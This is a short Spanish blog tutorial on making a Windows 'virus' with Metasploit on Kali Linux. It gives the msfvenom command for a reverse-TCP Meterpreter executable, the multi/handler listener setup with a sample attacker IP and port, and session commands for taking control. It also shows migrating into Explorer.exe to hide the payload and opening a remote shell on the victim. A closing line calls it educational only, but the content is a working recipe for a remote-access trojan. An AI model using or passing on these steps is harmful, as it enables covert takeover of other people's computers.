# Creación de Virus y Control Remoto del Equipo Víctima con Kali Linux

Publicado el 9 de agosto de 2015 por David

## Introducción

En este tutorial, aprenderás cómo crear un virus usando el Metasploit Framework en Kali Linux. Este proceso incluye la generación de un payload y la configuración de un servidor para interactuar y controlar remotamente el equipo infectado.

### Creación del Payload

Para comenzar, necesitas abrir una terminal en Kali Linux y ejecutar el siguiente comando:

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=[tu IP] LPORT=9999 -a x86 –platform windows -o /root/Desktop/virus.exe -f exe```

`-p`: Especifica el payload a utilizar.
`-a`: Define la arquitectura que utilizará el virus.
`--platform`: Determina la plataforma en la que actuará el virus.
`-o`: Establece el directorio donde se guardará el virus.
`-f`: Define el formato en el que se guardará el virus.

# Creación del Servidor
Para interactuar con los equipos infectados, abre otra terminal y ejecuta:
msfconsole

Dentro de Metasploit, configura el handler para el payload:
`use multi/handler`
`set PAYLOAD windows/meterpreter/reverse_tcp`
`set LHOST 192.168.1.116`
`set LPORT 9999`
`exploit -j`

# Explotación y Control Remoto
Una vez que el virus se ejecute en una máquina Windows, podrás controlarla remotamente. Usa el comando `sessions -i` para ver las sesiones activas y conectarte a la máquina atacada:
`sessions -i 1`

Con esto, tendrás acceso a los procesos de la máquina infectada. Puedes ocultar el virus fusionándolo con otro proceso como `Explorer.exe` usando el comando `migrate`.

# Obtención de la Shell Remota
Para interactuar directamente con la máquina infectada:
`shell`

Advertencia
Este tutorial es meramente educativo. Crear y distribuir virus es una actividad ilegal en muchas jurisdicciones. Este conocimiento debe usarse solo en entornos controlados y con fines educativos.
